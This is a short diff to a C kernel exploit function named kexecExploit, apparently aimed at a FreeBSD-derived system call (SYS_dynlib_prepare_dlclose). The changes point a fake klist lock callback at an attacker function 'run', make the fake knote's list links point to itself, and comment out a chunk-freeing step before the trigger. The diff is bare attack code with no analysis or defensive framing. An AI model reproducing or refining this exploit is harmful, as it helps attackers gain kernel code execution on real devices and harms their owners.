@@ -238,15 +238,13 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 
 	knist.kl_list.slh_first = &kote;
 
-	knist.kl_lock = dummy;
+	knist.kl_lock = run;
 	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
 	knist.kl_lockarg = NULL;
 
 	kote.kn_knlist = &knist;
-	kote.kn_link.sle_next = kote.kn_selnext.sle_next = NULL; //&kote;
+	kote.kn_link.sle_next = kote.kn_selnext.sle_next = &kote;
 	kote.kn_kevent.ident = fd;
-
-printf("%zu\n", sizeof(struct klist));
 
 	kist = (struct klist *)(map + bufferSize);
 	for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
@@ -258,10 +256,11 @@ printf("%zu\n", sizeof(struct klist));
 	printf("SYS_dynlib_prepare_dlclose: %i\n", r);
 
 	printf("wait ... ");
-	sleep(10);
+	sleep(20);
 	printf("go\n");
 	fflush(stdout);
 
+/*
 	// free all intermediates - unless global fd - nothing happens here
 	for(i = 0; i < intermediateChunkCount; i++)
 	{
@@ -276,6 +275,7 @@ printf("%zu\n", sizeof(struct klist));
 	sleep(0);
 	printf("go\n");
 	fflush(stdout);
+*/
 
 	printf("Pre Trigger\n");
 	fflush(stdout);
